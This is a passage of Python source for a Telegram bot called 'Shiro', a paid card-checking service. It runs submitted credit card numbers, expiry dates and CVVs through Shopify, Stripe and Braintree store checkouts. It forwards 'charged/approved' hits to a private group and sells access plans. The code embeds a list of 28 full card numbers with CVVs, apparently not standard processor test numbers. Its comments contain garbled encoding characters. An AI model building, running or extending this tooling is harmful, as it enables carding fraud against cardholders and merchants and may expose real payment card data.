# Shiro Telegram Bot - Shopify checker using gg.py
# Commands: /sh, /msh, /ac, /setsite, /setproxies
# Bot name: Shiro
# Sites and proxies persisted in MongoDB

import asyncio
import html as _html
import io
import json as _json_mod
import random
import re as _re
import requests
import secrets
import sys
import os
import time
import threading
import traceback
import signal
import functools
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone, timedelta

import httpx

from shopifyapi import (
    format_proxy, load_proxy_list, check_site_fast,
    run_shopify_check,
)
try:
    from stripeapi import (
        try_checkout_card, fetch_checkout_info,
    )
    _HAS_STRIPE = True
except ImportError:
    _HAS_STRIPE = False
    def try_checkout_card(*a, **kw): return {"status": "Error", "message": "stripeapi not installed"}
    def fetch_checkout_info(*a, **kw): return None

try:
    from braintreeapi import run_braintree_check_sync as _bt_check_sync, check_bt_site_fast as _bt_site_fast
    _HAS_BT = True
except ImportError:
    _HAS_BT = False
    def _bt_check_sync(*a, **kw): return {"status": "Error", "message": "braintreeapi not installed"}
    def _bt_site_fast(*a, **kw): return (False, "braintreeapi not installed")

try:
    from stripecharge import check_stripe_gate as _st_check_sync, format_stripe_ui as _st_format_ui
    _HAS_ST = True
except ImportError:
    _HAS_ST = False
    def _st_check_sync(*a, **kw): return {"status": "Error", "message": "stripecharge not installed", "is_approved": False}
    def _st_format_ui(*a, **kw): return "stripecharge not installed"

# Ensure gg can be imported
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# Ã¢â€â‚¬Ã¢â€â‚¬ Shared asyncio event loop (runs in a daemon thread) Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
# Use uvloop on Linux for 2-4x faster async I/O (not available on Windows)
try:
    import uvloop
    _shared_loop = uvloop.new_event_loop()
    _uvloop_loaded = True
except ImportError:
    _shared_loop = asyncio.new_event_loop()
    _uvloop_loaded = False

def _start_shared_loop(loop):
    asyncio.set_event_loop(loop)
    loop.run_forever()

_loop_thread = threading.Thread(target=_start_shared_loop, args=(_shared_loop,), daemon=True)
_loop_thread.start()

# Load .env so SHIRO_MONGO_URI, BOT_TOKEN, DEBUG can be set there
try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass

DEBUG = os.environ.get("DEBUG", "true").lower() in ("1", "true", "yes")

# Ã¢â€â‚¬Ã¢â€â‚¬ Clean, Professional Debug Logger Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
class ShiroLogger:
    """Clean, compact, professional logging system"""
    
    COLORS = {
        'RESET': '\033[0m',
        'GREEN': '\033[92m',
        'YELLOW': '\033[93m',
        'RED': '\033[91m',
        'BLUE': '\033[94m',
        'CYAN': '\033[96m',
        'GRAY': '\033[90m',
    }
    
    def __init__(self, debug=False):
        self.debug_enabled = debug
    
    def _timestamp(self):
        return datetime.now().strftime('%H:%M:%S')
    
    def _format(self, level, category, message, color='RESET'):
        """Format: [HH:MM:SS] [LEVEL] Category: Message"""
        ts = self._timestamp()
        if sys.stdout.isatty():
            return f"{self.COLORS['GRAY']}[{ts}]{self.COLORS['RESET']} {self.COLORS[color]}[{level}]{self.COLORS['RESET']} {category}: {message}"
        return f"[{ts}] [{level}] {category}: {message}"
    
    def success(self, category, message):
        """Ã¢Å“â€¦ Success messages"""
        print(self._format('Ã¢Å“â€œ', category, message, 'GREEN'))
    
    def info(self, category, message):
        """Ã¢â€žÂ¹Ã¯Â¸Â Info messages"""
        print(self._format('i', category, message, 'BLUE'))
    
    def warning(self, category, message):
        """Ã¢Å¡Â Ã¯Â¸Â Warning messages"""
        print(self._format('!', category, message, 'YELLOW'))
    
    def error(self, category, message):
        """Ã¢ÂÅ’ Error messages"""
        print(self._format('Ã¢Å“â€”', category, message, 'RED'))
    
    def debug(self, category, message):
        """Ã°Å¸â€Â Debug messages (only if debug enabled)"""
        if self.debug_enabled:
            print(self._format('D', category, message, 'CYAN'))
    
    def cmd(self, user, user_id, command):
        """Command execution log"""
        print(self._format('CMD', f'@{user} ({user_id})', command, 'BLUE'))
    
    def check(self, card_last4, status, message):
        """Card check result"""
        color = 'GREEN' if status in ['Charged', 'Approved'] else 'RED' if status == 'Declined' else 'YELLOW'
        print(self._format('CHK', f'****{card_last4}', f'{status}: {message[:50]}', color))

log = ShiroLogger(debug=DEBUG)

# Ã¢â€â‚¬Ã¢â€â‚¬ Card Validation Utilities Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
def _luhn_check(card_number):
    """Validate card number using Luhn algorithm. Returns True if valid."""
    digits = [int(d) for d in str(card_number) if d.isdigit()]
    if len(digits) < 13 or len(digits) > 19:
        return False
    digits.reverse()
    total = 0
    for i, d in enumerate(digits):
        if i % 2 == 1:
            d *= 2
            if d > 9:
                d -= 9
        total += d
    return total % 10 == 0

def _validate_card_format(card_str):
    """Validate card format and Luhn. Returns (valid, error_msg)."""
    parts = card_str.split("|")
    if len(parts) != 4:
        return False, "Invalid format (need: number|mm|yy|cvv)"
    num, mm, yy, cvv = parts
    if not num.isdigit() or len(num) < 13 or len(num) > 19:
        return False, "Invalid card number length"
    if not _luhn_check(num):
        return False, "Invalid card number (Luhn check failed)"
    if not mm.isdigit() or not (1 <= int(mm) <= 12):
        return False, "Invalid expiry month"
    if not yy.isdigit() or len(yy) not in (2, 4):
        return False, "Invalid expiry year"
    if not cvv.isdigit() or len(cvv) not in (3, 4):
        return False, "Invalid CVV"
    now = datetime.now(timezone.utc)
    exp_year = int(yy) if len(yy) == 4 else 2000 + int(yy)
    exp_month = int(mm)
    if exp_year < now.year or (exp_year == now.year and exp_month < now.month):
        return False, "Card expired"
    return True, None

import telebot
from telebot import types
try:
    from telebot.handler_backends import CancelUpdate
except ImportError:
    CancelUpdate = None  # older pyTeleBot

BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
if not BOT_TOKEN:
    raise RuntimeError("BOT_TOKEN not set. Add it to .env or environment variables.")
from telebot import apihelper
apihelper.ENABLE_MIDDLEWARE = True
# Use aiohttp as the HTTP backend for Telegram API calls (faster, connection-pooled)
try:
    from telebot import asyncio_helper
    apihelper.CUSTOM_REQUEST_SENDER = None  # let telebot use default but we configure below
except ImportError:
    pass
bot = telebot.TeleBot(BOT_TOKEN, threaded=True, num_threads=16)

# Ã¢â€â‚¬Ã¢â€â‚¬ Global crash handler decorator Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
def _crash_safe(func):
    """Decorator: wraps handler so unhandled exceptions log + reply error instead of crashing the bot."""
    @functools.wraps(func)
    def wrapper(*args, **kwargs):
        try:
            return func(*args, **kwargs)
        except Exception as e:
            # Log the full traceback
            log.error('Crash', f'Handler {func.__name__} crashed: {e}')
            traceback.print_exc()
            # Try to notify the user
            try:
                msg = args[0] if args else None
                if msg and hasattr(msg, 'chat'):
                    bot.reply_to(msg, "Ã¢Å¡Â Ã¯Â¸Â An internal error occurred. Please try again.", parse_mode="HTML")
                elif msg and hasattr(msg, 'message'):  # callback_query
                    bot.answer_callback_query(msg.id, "Ã¢Å¡Â Ã¯Â¸Â Internal error. Try again.", show_alert=True)
            except Exception:
                pass  # don't crash the crash handler
    return wrapper

# Ã¢â€â‚¬Ã¢â€â‚¬ Bot-level exception handler Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
class _BotExceptionHandler(telebot.ExceptionHandler):
    def handle(self, exception):
        log.error('Bot', f'{type(exception).__name__}: {exception}')
        traceback.print_exc()
        return True  # True = exception handled, don't re-raise

bot.exception_handler = _BotExceptionHandler()
# Owner-only commands (/resetdb, /cleardb). Set SHIRO_OWNER_ID to your Telegram user ID(s), comma-separated.
_raw_owners = os.environ.get("SHIRO_OWNER_ID", "").strip()
OWNER_IDS = set()
for _tok in _raw_owners.replace(" ", "").split(","):
    if _tok:
        try:
            OWNER_IDS.add(int(_tok))
        except ValueError:
            pass

# Ã¢â€â‚¬Ã¢â€â‚¬ Updating / Maintenance mode Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
UPDATING_MODE = False

# Test cards used to validate sites when adding (only working sites are saved)
# If a site declines the CC, the site's payment gateway is working = site is valid
TEST_CCS = [
    "4977830296899843|09|25|247",
    "4100390678760485|12|26|341",
    "5178058429781365|07|26|531",
    "4232233008460817|04|28|133",
    "5187257684936826|02|29|966",
    "4190027442125360|10|28|498",
    "4147202476179591|01|26|222",
    "4147098448993188|09|27|247",
    "5187252186350196|08|27|977",
    "5374100180159134|11|25|281",
    "5178059476681391|07|28|323",
    "5178058238739612|03|27|909",
    "5156769073970080|07|27|992",
    "4640182056028222|12|27|312",
    "4364340008085419|09|28|273",
    "4744760311371605|01|29|927",
    "5156769606217975|11|26|675",
    "5414495060193985|01|27|909",
    "4147098493441505|03|27|521",
    "5153076655834871|01|26|591",
    "5143773304682940|04|27|229",
    "4034462052956418|04|32|548",
    "5424181504665899|12|26|693",
    "4428682000094384|01|27|320",
    "4373070030372456|02|27|443",
    "4364340004504223|01|28|387",
    "5143773632465703|12|26|408",
    "4031630111600226|03|29|417",
]
TEST_CC = TEST_CCS[0]  # backwards compat
# Only add sites whose first product price is at or below this (avoid expensive stores)

# Auto-join channel/group settings
AUTO_JOIN_CHANNEL = os.environ.get("AUTO_JOIN_CHANNEL", "").strip()  # e.g., @yourchannel or -1001234567890
AUTO_JOIN_GROUP = os.environ.get("AUTO_JOIN_GROUP", "").strip()  # e.g., @yourgroup or -1001234567890
MAX_SITE_PRICE = float(os.environ.get("MAX_SITE_PRICE", "40.0"))
MIN_SITE_PRICE = float(os.environ.get("MIN_SITE_PRICE", "10.0"))

# Discord webhooks (set in .env to override)
# Console = full live console logs ONLY. Hits go to Telegram private group.
DISCORD_WEBHOOK_CONSOLE = os.environ.get("DISCORD_WEBHOOK_CONSOLE", "").strip()
DISCORD_WEBHOOK_HITS = os.environ.get("DISCORD_WEBHOOK_HITS", "").strip()  # legacy, kept for backwards compat

# Telegram private group for hits (proxies set + charged/approved CC)
# Add the bot to a private group, then set the group chat ID here (e.g., -1001234567890)
SHIRO_HITS_CHAT = os.environ.get("SHIRO_HITS_CHAT", "").strip()

# Ã¢â€â‚¬Ã¢â€â‚¬ Persistent aiohttp session for Discord webhooks (declare before use) Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
_aio_session = None
_aio_session_lock = threading.Lock()

# Ã¢â€â‚¬Ã¢â€â‚¬ Live Console Mirror to Discord Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
# Intercepts ALL print() / stdout / stderr output and sends it to the Discord
# console webhook in real-time, batching lines every 2 seconds to avoid rate-limits.
class _DiscordConsoleMirror:
    """Wraps sys.stdout/stderr to buffer lines and flush them to Discord periodically."""
    _FLUSH_INTERVAL = 2.0   # seconds between Discord posts
    _MAX_CONTENT = 1900     # Discord message limit (leave room for formatting)

    def __init__(self, original, webhook_url):
        self._original = original
        self._webhook = webhook_url
        self._buffer = []
        self._lock = threading.Lock()
        self._timer = None
        self._started = False

    # Ã¢â‚¬â€ file-like interface so it can replace sys.stdout Ã¢â‚¬â€
    def write(self, text):
        if self._original:
            self._original.write(text)
        if not text:
            return
        with self._lock:
            self._buffer.append(text)
            if not self._started:
                self._started = True
                self._schedule_flush()

    def flush(self):
        if self._original:
            self._original.flush()

    def isatty(self):
        return False

    @property
    def encoding(self):
        return getattr(self._original, "encoding", "utf-8")

    def fileno(self):
        if self._original:
            return self._original.fileno()
        raise OSError("no underlying fileno")

    # Ã¢â‚¬â€ batched Discord posting Ã¢â‚¬â€
    def _schedule_flush(self):
        self._timer = threading.Timer(self._FLUSH_INTERVAL, self._flush_to_discord)
        self._timer.daemon = True
        self._timer.start()

    def _flush_to_discord(self):
        with self._lock:
            if not self._buffer:
                self._schedule_flush()
                return
            chunk = "".join(self._buffer)
            self._buffer.clear()
        # Split into <=1900-char blocks
        lines = chunk.rstrip("\n")
        if not lines:
            self._schedule_flush()
            return
        blocks = []
        current = ""
        for line in lines.split("\n"):
            candidate = (current + "\n" + line) if current else line
            if len(candidate) > self._MAX_CONTENT:
                if current:
                    blocks.append(current)
                current = line[:self._MAX_CONTENT]
            else:
                current = candidate
        if current:
            blocks.append(current)
        for block in blocks:
            self._post(f"```\n{block}\n```")
        self._schedule_flush()

    def _post(self, content):
        """Post to Discord Ã¢â‚¬â€ uses aiohttp if available, falls back to httpx."""
        try:
            if _aio_session is not None and not _aio_session.closed:
                _aio_post_sync(self._webhook, {"content": content})
            else:
                httpx.post(self._webhook, json={"content": content}, timeout=3.0)
        except Exception:
            pass  # never crash the bot for a webhook failure


if DISCORD_WEBHOOK_CONSOLE:
    _stdout_mirror = _DiscordConsoleMirror(sys.stdout, DISCORD_WEBHOOK_CONSOLE)
    _stderr_mirror = _DiscordConsoleMirror(sys.stderr, DISCORD_WEBHOOK_CONSOLE)
    sys.stdout = _stdout_mirror
    sys.stderr = _stderr_mirror

# MongoDB Ã¢â‚¬â€œ from .env or SHIRO_MONGO_URI env var
MONGO_URI = os.environ.get("SHIRO_MONGO_URI")
if not MONGO_URI:
    log.warning('Config', 'SHIRO_MONGO_URI not set - MongoDB features disabled')

MONGO_DB_NAME = "shiro"
MONGO_COLLECTION = "chats"
MONGO_USERS_COLLECTION = "users"

INITIAL_CREDITS = 100
CREDITS_PER_CHECK = 1
MASS_MAX_CARDS = 200

# Ã¢â€â‚¬Ã¢â€â‚¬ Plan definitions Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
PLANS = {
    "basic": {"name": "Basic", "price": "$5/week", "days": 7, "credits": -1},    # -1 = unlimited
    "pro":   {"name": "Pro",   "price": "$15/month", "days": 30, "credits": -1},
}

# Pre-compiled duration pattern: 1d, 2h, 30m, 1w or combos like 1d12h
_RE_DURATION = _re.compile(r'(\d+)\s*([wdhm])', _re.I)

def _parse_duration(text):
    """Parse duration string like '1d', '2h30m', '1w', '7d12h' into total minutes. Returns 0 on failure."""
    matches = _RE_DURATION.findall(text)
    if not matches:
        return 0
    total_min = 0
    for val, unit in matches:
        v = int(val)
        u = unit.lower()
        if u == 'w':
            total_min += v * 7 * 24 * 60
        elif u == 'd':
            total_min += v * 24 * 60
        elif u == 'h':
            total_min += v * 60
        elif u == 'm':
            total_min += v
    return total_min

_mongo_client = None
_mongo_db = None
_mongo_coll = None
_mongo_users_coll = None

_mongo_init_lock = threading.Lock()

def _get_mongo():
    """Lazy init MongoDB connection. Returns (db, collection) or (None, None) on failure."""
    global _mongo_client, _mongo_db, _mongo_coll, _mongo_users_coll
    if _mongo_coll is not None:
        return _mongo_db, _mongo_coll
    
    with _mongo_init_lock:
        # Double-check after acquiring lock
        if _mongo_coll is not None:
            return _mongo_db, _mongo_coll
        
        # Check if MONGO_URI is set
        if not MONGO_URI:
            return None, None
        
        try:
            from pymongo import MongoClient
            _mongo_client = MongoClient(
                MONGO_URI,
                serverSelectionTimeoutMS=5000,
                maxPoolSize=20,
                minPoolSize=2,
                maxIdleTimeMS=60000,
                connectTimeoutMS=5000,
                socketTimeoutMS=10000,
                retryWrites=True,
                retryReads=True,
            )
            _mongo_client.admin.command("ping")
            _mongo_db = _mongo_client[MONGO_DB_NAME]
            _mongo_coll = _mongo_db[MONGO_COLLECTION]
            _mongo_users_coll = _mongo_db[MONGO_USERS_COLLECTION]
            return _mongo_db, _mongo_coll
        except Exception as e:
            if DEBUG:
                print(f"[Mongo] Connection failed: {e}")
            return None, None


def _users_coll():
    """Return cached users collection (avoids re-creating Collection wrapper)."""
    if _mongo_users_coll is not None:
        return _mongo_users_coll
    _get_mongo()  # ensure connection is initialised
    return _mongo_users_coll


_mongo_codes_coll = None

def _codes_coll():
    """Get credit codes collection (cached)."""
    global _mongo_codes_coll
    if _mongo_codes_coll is not None:
        return _mongo_codes_coll
    db, _ = _get_mongo()
    if db is None:
        return None
    _mongo_codes_coll = db["credit_codes"]
    return _mongo_codes_coll


def generate_credit_code(credits, max_uses=1):
    """Generate a unique credit code."""
    code = secrets.token_urlsafe(12).upper()[:12]
    codes_col = _codes_coll()
    if codes_col is None:
        return None
    
    codes_col.insert_one({
        "code": code,
        "credits": credits,
        "max_uses": max_uses,
        "used_count": 0,
        "used_by": [],
        "created_at": datetime.now(timezone.utc)
    })
    return code


def redeem_credit_code(user_id, code):
    """Redeem a credit code. Returns (success, message, credits). Atomic to prevent double-redeem."""
    codes_col = _codes_coll()
    if codes_col is None:
        return False, "Database error", 0

    users_col = _users_coll()
    if users_col is None:
        return False, "Database error", 0

    try:
        # Atomic: claim the code only if user hasn't used it and uses remain
        code_doc = codes_col.find_one_and_update(
            {
                "code": code.upper(),
                "used_by": {"$ne": user_id},
                "$expr": {"$lt": ["$used_count", "$max_uses"]},
            },
            {
                "$inc": {"used_count": 1},
                "$push": {"used_by": user_id},
            },
        )
        if not code_doc:
            # Determine why it failed for a helpful message
            existing = codes_col.find_one({"code": code.upper()})
            if not existing:
                return False, "Invalid code", 0
            if user_id in existing.get("used_by", []):
                return False, "Code already redeemed", 0
            return False, "Code expired", 0

        credits = code_doc.get("credits", 0)
        code_type = code_doc.get("type", "credits")

        # Handle plan codes
        if code_type == "plan":
            plan_key = code_doc.get("plan", "basic")
            dur_min = code_doc.get("duration_minutes", 0)
            if not dur_min:
                # Backwards compat: old codes stored days
                dur_min = code_doc.get("days", 30) * 24 * 60
            if _set_user_plan(user_id, plan_key, minutes=dur_min):
                if DEBUG:
                    print(f"[Mongo] Ã¢Å“â€¦ User {user_id} activated {plan_key} plan for {dur_min} minutes")
                return True, f"plan:{plan_key}:{dur_min}", 0
            else:
                # Roll back code claim
                codes_col.update_one(
                    {"code": code.upper()},
                    {"$inc": {"used_count": -1}, "$pull": {"used_by": user_id}},
                )
                return False, "Failed to activate plan", 0

        # Handle credit codes
        # Add credits to user
        result = users_col.update_one(
            {"_id": user_id},
            {"$inc": {"credits": credits}},
            upsert=False,
        )
        if result.matched_count == 0:
            # Roll back code claim
            codes_col.update_one(
                {"code": code.upper()},
                {"$inc": {"used_count": -1}, "$pull": {"used_by": user_id}},
            )
            return False, "User not found", 0

        _invalidate_user_cache(user_id)

        if DEBUG:
            new_balance = get_credits(user_id)
            print(f"[Mongo] Ã¢Å“â€¦ User {user_id} redeemed code {code} for {credits} credits, new balance: {new_balance}")

        return True, f"Redeemed {credits} credits", credits

    except Exception as e:
        if DEBUG:
            print(f"[Mongo] Ã¢ÂÅ’ Redeem error for user {user_id}: {e}")
        return False, "Database error", 0


def list_credit_codes():
    """List all credit codes (owner only)."""
    codes_col = _codes_coll()
    if codes_col is None:
        return []
    
    codes = list(codes_col.find().sort("created_at", -1).limit(20))
    return codes


def _esc(text):
    """Escape text for Telegram HTML: &, <, >."""
    if not text:
        return text
    return _html.escape(str(text), quote=False)


@functools.lru_cache(maxsize=256)
def _to_bold_sans(text):
    """Convert text to bold sans-serif Unicode characters (fast str.translate, HTML-aware).
    Cached Ã¢â‚¬â€ most calls use identical constant strings."""
    if not text:
        return text
    # Fast path: if no HTML tags, use str.translate directly
    if '<' not in text:
        return text.translate(_BOLD_SANS_TABLE)
    # HTML-aware: split on tags, only translate outside <code>...</code> and inside non-tag text
    result = []
    in_code = False
    in_tag = False
    i = 0
    tlen = len(text)
    seg_start = 0
    while i < tlen:
        ch = text[i]
        if ch == '<':
            # Flush preceding segment
            seg = text[seg_start:i]
            if seg:
                if in_code or in_tag:
                    result.append(seg)
                else:
                    result.append(seg.translate(_BOLD_SANS_TABLE))
            in_tag = True
            rest = text[i:]
            if rest.startswith('<code>'):
                in_code = True
            elif rest.startswith('</code>'):
                in_code = False
            seg_start = i
            i += 1
        elif ch == '>' and in_tag:
            in_tag = False
            result.append(text[seg_start:i + 1])
            i += 1
            seg_start = i
        else:
            i += 1
    # Tail
    if seg_start < tlen:
        seg = text[seg_start:]
        if in_code or in_tag:
            result.append(seg)
        else:
            result.append(seg.translate(_BOLD_SANS_TABLE))
    return ''.join(result)

# Pre-built translation table (module level, created once)
# Mathematical Sans-Serif Bold: U+1D5D4..U+1D607 (A-Z, a-z), Bold digits: U+1D7CE..U+1D7D7
_BOLD_SANS_TABLE = str.maketrans(
    'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789',
    ''.join(chr(c) for c in list(range(0x1D5D4, 0x1D5D4+26))
                                + list(range(0x1D5EE, 0x1D5EE+26))
                                + list(range(0x1D7CE, 0x1D7CE+10)))
)


# Enable bold sans-serif font globally for all messages
USE_BOLD_SANS = True


def _save_cached_image_file_id(file_id):
    """Save the cached image file_id to MongoDB for persistence across restarts."""
    db, _ = _get_mongo()
    if db is None:
        return
    try:
        cache_coll = db["bot_cache"]
        cache_coll.update_one(
            {"_id": "start_image"},
            {"$set": {"file_id": file_id}},
            upsert=True
        )
        if DEBUG:
            print(f"[Cache] Saved image file_id to MongoDB")
    except Exception as e:
        if DEBUG:
            print(f"[Cache] Failed to save to MongoDB: {e}")


def _load_cached_image_file_id():
    """Load the cached image file_id from MongoDB."""
    db, _ = _get_mongo()
    if db is None:
        return None
    try:
        cache_coll = db["bot_cache"]
        doc = cache_coll.find_one({"_id": "start_image"})
        if doc and "file_id" in doc:
            return doc["file_id"]
    except Exception as e:
        if DEBUG:
            print(f"[Cache] Failed to load from MongoDB: {e}")
    return None


def _clear_cached_image():
    """Clear the cached image from MongoDB (use when changing image)."""
    global _cached_image_file_id
    _cached_image_file_id = None
    db, _ = _get_mongo()
    if db is None:
        return
    try:
        cache_coll = db["bot_cache"]
        cache_coll.delete_one({"_id": "start_image"})
        if DEBUG:
            print(f"[Cache] Cleared image cache from MongoDB")
    except Exception as e:
        if DEBUG:
            print(f"[Cache] Failed to clear cache: {e}")


def is_registered(user_id):
    """True if user has a document in users collection."""
    coll = _users_coll()
    if coll is None:
        return False
    try:
        return coll.find_one({"_id": user_id}) is not None
    except Exception:
        return False


def get_credits(user_id):
    """Return current credits for user, or None if not registered."""
    coll = _users_coll()
    if coll is None:
        return None
    try:
        doc = coll.find_one({"_id": user_id})
        return doc.get("credits", 0) if doc else None
    except Exception:
        return None


def register_user(user_id, username=None, first_name=None):
    """Register user with INITIAL_CREDITS. Returns True if newly registered."""
    coll = _users_coll()
    if coll is None:
